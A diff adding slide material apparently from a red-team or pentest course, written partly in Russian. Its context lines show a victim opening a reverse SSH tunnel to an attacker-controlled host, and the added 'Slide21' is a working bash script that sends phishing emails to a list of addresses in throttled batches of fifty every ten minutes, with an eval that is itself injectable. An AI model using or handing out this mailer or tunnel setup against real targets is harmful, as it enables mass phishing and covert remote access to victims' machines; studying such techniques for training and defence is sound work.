@@ -26,3 +26,46 @@ attacker> useradd -M -N -d /dev/null -s /bin/false proxy
 attacker> passwd proxy
 victim> ssh proxy@attacker -N -R 1337
 ```
+
+Slide21:
+
+```shell
+#!/bin/bash
+
+EMAILS_FILE="emails.txt"
+
+SENDMAIL_CMD='cat ./msg.txt | sendemail -f "Служба фишинга <task@pohek.ru>" -t "<email>" -u "Ломаем" -s smtp.phish:123 -xu user -xp password -o message-charset=utf-8'
+
+if [[ ! -f "$EMAILS_FILE" ]]; then
+    echo "File $EMAILS_FILE not found!"
+    exit 1
+fi
+
+emails=($(cat "$EMAILS_FILE"))
+emails_count=${#emails[@]}
+
+batch_size=50    # Число адресатов за раз
+interval=600     # Интервал в секундах (10 минут)
+
+current_index=0
+while [[ $current_index -lt $emails_count ]]; do
+
+    batch_emails=("${emails[@]:$current_index:$batch_size}")
+    
+    echo "Sending next block email'ов (${current_index} - $((current_index + batch_size - 1))):"
+    
+    for email in "${batch_emails[@]}"; do
+        eval "${SENDMAIL_CMD/<email>/$email}"
+        echo "Sending mail to $email"
+    done
+
+    current_index=$((current_index + batch_size))
+    
+    if [[ $current_index -lt $emails_count ]]; then
+        echo "Waiting $((interval / 60)) minutes before next sending..."
+        sleep $interval
+    fi
+done
+
+echo "Success!"
+```
